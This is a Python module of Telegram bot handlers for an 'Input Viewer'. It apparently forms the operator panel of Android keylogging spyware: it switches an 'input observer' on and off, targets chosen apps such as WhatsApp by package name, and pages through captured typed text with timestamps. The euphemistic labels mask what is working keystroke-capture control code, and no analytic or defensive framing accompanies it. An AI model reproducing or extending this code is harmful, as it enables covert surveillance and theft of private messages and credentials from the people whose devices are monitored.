import logging
from datetime import datetime
from bot.database.db_manager import db
from bot.menus.viewer_menu import (
    viewer_menu, viewer_menu_text,
    viewer_apps_menu, viewer_logs_menu,
    viewer_confirm_clear_logs, viewer_queue_menu
)
from bot.menus.main_menu import back_to_main
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

logger = logging.getLogger(__name__)

LOGS_PER_PAGE = 5

# ─────────────────────────────────────────
# STATE TRACKER FOR MULTI-STEP INPUTS
# ─────────────────────────────────────────
viewer_state = {}

# ─────────────────────────────────────────
# REGISTER INPUT VIEWER HANDLERS
# ─────────────────────────────────────────
def register_viewer_handlers(bot):

    # ── OPEN VIEWER MENU ──
    @bot.callback_query_handler(func=lambda c: c.data == "menu_viewer")
    def handle_viewer_menu(call):
        try:
            viewer_active = db.get_setting("viewer_enabled", "true") == "true"
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=viewer_menu_text(viewer_active),
                reply_markup=viewer_menu(viewer_active),
                parse_mode="HTML"
            )
        except Exception as e:
            logger.error(f"Viewer menu error: {e}")

    # ── START VIEWER ──
    @bot.callback_query_handler(func=lambda c: c.data == "viewer_start")
    def handle_viewer_start(call):
        try:
            db.set_setting("viewer_enabled", "true")
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=(
                    "▶️ <b>Input Viewer Started</b>\n"
                    "━━━━━━━━━━━━━━━━\n"
                    "✅ Input observer is now active.\n"
                    "Text typed in focused apps will be sent here."
                ),
                reply_markup=viewer_menu(viewer_active=True),
                parse_mode="HTML"
            )
        except Exception as e:
            logger.error(f"Viewer start error: {e}")

    # ── STOP VIEWER ──
    @bot.callback_query_handler(func=lambda c: c.data == "viewer_stop")
    def handle_viewer_stop(call):
        try:
            db.set_setting("viewer_enabled", "false")
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=(
                    "⏹ <b>Input Viewer Stopped</b>\n"
                    "━━━━━━━━━━━━━━━━\n"
                    "🔴 Input observer is now inactive."
                ),
                reply_markup=viewer_menu(viewer_active=False),
                parse_mode="HTML"
            )
        except Exception as e:
            logger.error(f"Viewer stop error: {e}")

    # ── ADD FOCUSED APP ──
    @bot.callback_query_handler(func=lambda c: c.data == "viewer_add_app")
    def handle_viewer_add_app(call):
        try:
            msg = bot.send_message(
                chat_id=call.message.chat.id,
                text=(
                    "➕ <b>Add Focused App</b>\n"
                    "━━━━━━━━━━━━━━━━\n"
                    "Send the app display name:\n"
                    "<i>Example: WhatsApp</i>"
                ),
                parse_mode="HTML"
            )
            bot.register_next_step_handler(msg, process_add_app_name)
        except Exception as e:
            logger.error(f"Viewer add app error: {e}")

    def process_add_app_name(message):
        try:
            app_name = message.text.strip()
            viewer_state[message.from_user.id] = {"step": "awaiting_package", "app_name": app_name}
            msg = bot.send_message(
                chat_id=message.chat.id,
                text=(
                    f"➕ <b>Add Focused App</b>\n"
                    f"━━━━━━━━━━━━━━━━\n"
                    f"App: <b>{app_name}</b>\n\n"
                    f"Now send the package name:\n"
                    f"<i>Example: com.whatsapp</i>"
                ),
                parse_mode="HTML"
            )
            bot.register_next_step_handler(msg, process_add_app_package)
        except Exception as e:
            logger.error(f"Process add app name error: {e}")

    def process_add_app_package(message):
        try:
            state = viewer_state.get(message.from_user.id, {})
            app_name = state.get("app_name", "")
            package_name = message.text.strip()
            success = db.add_focused_app(app_name, package_name)
            if success:
                bot.send_message(
                    chat_id=message.chat.id,
                    text=(
                        f"✅ <b>App Added to Observer</b>\n"
                        f"━━━━━━━━━━━━━━━━\n"
                        f"📲 App: <b>{app_name}</b>\n"
                        f"📦 Package: <code>{package_name}</code>\n\n"
                        f"Text typed in this app will now be observed."
                    ),
                    reply_markup=back_to_main(),
                    parse_mode="HTML"
                )
            else:
                bot.send_message(
                    chat_id=message.chat.id,
                    text=(
                        f"⚠️ <b>App already exists or add failed</b>\n"
                        f"App: <b>{app_name}</b>"
                    ),
                    reply_markup=back_to_main(),
                    parse_mode="HTML"
                )
            viewer_state.pop(message.from_user.id, None)
        except Exception as e:
            logger.error(f"Process add app package error: {e}")

    # ── LIST FOCUSED APPS ──
    @bot.callback_query_handler(func=lambda c: c.data == "viewer_list_apps")
    def handle_viewer_list_apps(call):
        try:
            apps = db.get_focused_apps()
            if not apps:
                bot.edit_message_text(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    text=(
                        "📋 <b>Focused Apps</b>\n"
                        "━━━━━━━━━━━━━━━━\n"
                        "No apps added yet.\n"
                        "Use ➕ Add App to start observing."
                    ),
                    reply_markup=viewer_apps_menu([]),
                    parse_mode="HTML"
                )
                return

            text = f"📋 <b>Focused Apps ({len(apps)})</b>\n━━━━━━━━━━━━━━━━\n"
            for app in apps:
                text += (
                    f"📲 <b>{app['app_name']}</b>\n"
                    f"   📦 <code>{app['package_name']}</code>\n\n"
                )

            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=text,
                reply_markup=viewer_apps_menu(apps),
                parse_mode="HTML"
            )
        except Exception as e:
            logger.error(f"Viewer list apps error: {e}")

    # ── REMOVE APP (PROMPT) ──
    @bot.callback_query_handler(func=lambda c: c.data == "viewer_remove_app")
    def handle_viewer_remove_app(call):
        try:
            apps = db.get_focused_apps()
            if not apps:
                bot.edit_message_text(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    text="📋 <b>No focused apps to remove</b>",
                    reply_markup=back_to_main(),
                    parse_mode="HTML"
                )
                return
            msg = bot.send_message(
                chat_id=call.message.chat.id,
                text=(
                    "➖ <b>Remove Focused App</b>\n"
                    "━━━━━━━━━━━━━━━━\n"
                    "Send the app name to remove:\n"
                    "<i>Example: WhatsApp</i>"
                ),
                parse_mode="HTML"
            )
            bot.register_next_step_handler(msg, process_remove_app_by_name)
        except Exception as e:
            logger.error(f"Viewer remove app error: {e}")

    def process_remove_app_by_name(message):
        try:
            app_name = message.text.strip()
            success = db.remove_focused_app(app_name)
            if success:
                bot.send_message(
                    chat_id=message.chat.id,
                    text=f"✅ <b>{app_name}</b> removed from observer.",
                    reply_markup=back_to_main(),
                    parse_mode="HTML"
                )
            else:
                bot.send_message(
                    chat_id=message.chat.id,
                    text=f"❌ App not found: <b>{app_name}</b>",
                    reply_markup=back_to_main(),
                    parse_mode="HTML"
                )
        except Exception as e:
            logger.error(f"Process remove app error: {e}")

    # ── REMOVE APP (DIRECT BUTTON FROM LIST) ──
    @bot.callback_query_handler(func=lambda c: c.data.startswith("viewer_remove_specific_"))
    def handle_viewer_remove_specific(call):
        try:
            app_name = call.data.replace("viewer_remove_specific_", "")
            success = db.remove_focused_app(app_name)
            apps = db.get_focused_apps()
            if success:
                if apps:
                    text = f"✅ <b>{app_name}</b> removed.\n\n📋 <b>Remaining Apps ({len(apps)})</b>\n━━━━━━━━━━━━━━━━\n"
                    for app in apps:
                        text += f"📲 <b>{app['app_name']}</b> — <code>{app['package_name']}</code>\n"
                    bot.edit_message_text(
                        chat_id=call.message.chat.id,
                        message_id=call.message.message_id,
                        text=text,
                        reply_markup=viewer_apps_menu(apps),
                        parse_mode="HTML"
                    )
                else:
                    bot.edit_message_text(
                        chat_id=call.message.chat.id,
                        message_id=call.message.message_id,
                        text=f"✅ <b>{app_name}</b> removed.\n\nNo focused apps remaining.",
                        reply_markup=viewer_apps_menu([]),
                        parse_mode="HTML"
                    )
            else:
                bot.answer_callback_query(call.id, f"❌ Remove failed for {app_name}")
        except Exception as e:
            logger.error(f"Viewer remove specific error: {e}")

    # ── VIEW LOGS ──
    @bot.callback_query_handler(func=lambda c: c.data in ["viewer_view_logs"] or c.data.startswith("viewer_logs_page_"))
    def handle_viewer_view_logs(call):
        try:
            page = 1
            if call.data.startswith("viewer_logs_page_"):
                try:
                    page = int(call.data.split("_")[-1])
                except ValueError:
                    page = 1

            all_logs = db.get_viewer_logs(limit=200)
            if not all_logs:
                bot.edit_message_text(
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    text=(
                        "📜 <b>Input Viewer Logs</b>\n"
                        "━━━━━━━━━━━━━━━━\n"
                        "No logs recorded yet.\n"
                        "Start the viewer and type on your phone to see input here."
                    ),
                    reply_markup=back_to_main(),
                    parse_mode="HTML"
                )
                return

            total_pages = max(1, (len(all_logs) + LOGS_PER_PAGE - 1) // LOGS_PER_PAGE)
            page = max(1, min(page, total_pages))
            start = (page - 1) * LOGS_PER_PAGE
            end = start + LOGS_PER_PAGE
            page_logs = all_logs[start:end]

            text = f"📜 <b>Input Viewer Logs</b> — Page {page}/{total_pages}\n━━━━━━━━━━━━━━━━\n"
            for i, log in enumerate(page_logs, start + 1):
                text += (
                    f"{i}. 📲 <b>{log['app_name']}</b>\n"
                    f"   ✏️ {log['input_text'][:80]}{'...' if len(log['input_text']) > 80 else ''}\n"
                    f"   🕐 {log['timestamp']}\n\n"
                )

            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=text,
                reply_markup=viewer_logs_menu(page, total_pages),
                parse_mode="HTML"
            )
        except Exception as e:
            logger.error(f"Viewer view logs error: {e}")

    # ── LOGS PAGE INFO (no-op tap on page counter) ──
    @bot.callback_query_handler(func=lambda c: c.data == "viewer_logs_page_info")
    def handle_viewer_logs_page_info(call):
        try:
            bot.answer_callback_query(call.id, "Current page indicator")
        except Exception as e:
            logger.error(f"Viewer logs page info error: {e}")

    # ── CONFIRM CLEAR LOGS ──
    @bot.callback_query_handler(func=lambda c: c.data == "viewer_clear_logs_confirm")
    def handle_viewer_clear_logs_confirm(call):
        try:
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=(
                    "⚠️ <b>Clear All Input Logs?</b>\n"
                    "━━━━━━━━━━━━━━━━\n"
                    "All recorded input logs will be deleted.\n"
                    "Are you sure?"
                ),
                reply_markup=viewer_confirm_clear_logs(),
                parse_mode="HTML"
            )
        except Exception as e:
            logger.error(f"Viewer clear logs confirm error: {e}")

    # ── CLEAR LOGS ──
    @bot.callback_query_handler(func=lambda c: c.data == "viewer_clear_logs")
    def handle_viewer_clear_logs(call):
        try:
            with db.get_connection() as conn:
                conn.execute("DELETE FROM viewer_log")
                conn.commit()
            viewer_active = db.get_setting("viewer_enabled", "true") == "true"
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text="✅ <b>All input logs cleared successfully</b>",
                reply_markup=viewer_menu(viewer_active),
                parse_mode="HTML"
            )
        except Exception as e:
            logger.error(f"Viewer clear logs error: {e}")

    # ── CONFIRM CLEAR QUEUE ──
    @bot.callback_query_handler(func=lambda c: c.data == "viewer_clear_queue_confirm")
    def handle_viewer_clear_queue_confirm(call):
        try:
            queue = db.get_viewer_queue()
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=(
                    f"⚠️ <b>Clear Input Viewer Queue?</b>\n"
                    f"━━━━━━━━━━━━━━━━\n"
                    f"Pending items in queue: <b>{len(queue)}</b>\n"
                    f"These will be permanently deleted.\n"
                    f"Are you sure?"
                ),
                reply_markup=_confirm_clear_queue_markup("viewer_clear_queue", "menu_viewer"),
                parse_mode="HTML"
            )
        except Exception as e:
            logger.error(f"Viewer clear queue confirm error: {e}")

    # ── CLEAR QUEUE ──
    @bot.callback_query_handler(func=lambda c: c.data == "viewer_clear_queue")
    def handle_viewer_clear_queue(call):
        try:
            with db.get_connection() as conn:
                conn.execute("DELETE FROM viewer_queue")
                conn.commit()
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text="✅ <b>Input viewer queue cleared successfully</b>",
                reply_markup=back_to_main(),
                parse_mode="HTML"
            )
        except Exception as e:
            logger.error(f"Viewer clear queue error: {e}")


# ─────────────────────────────────────────
# INTERNAL HELPER
# ─────────────────────────────────────────
def _confirm_clear_queue_markup(confirm_cb: str, cancel_cb: str):
    markup = InlineKeyboardMarkup()
    markup.row(
        InlineKeyboardButton("✅ Yes, Clear", callback_data=confirm_cb),
        InlineKeyboardButton("❌ Cancel", callback_data=cancel_cb)
    )
    return markup
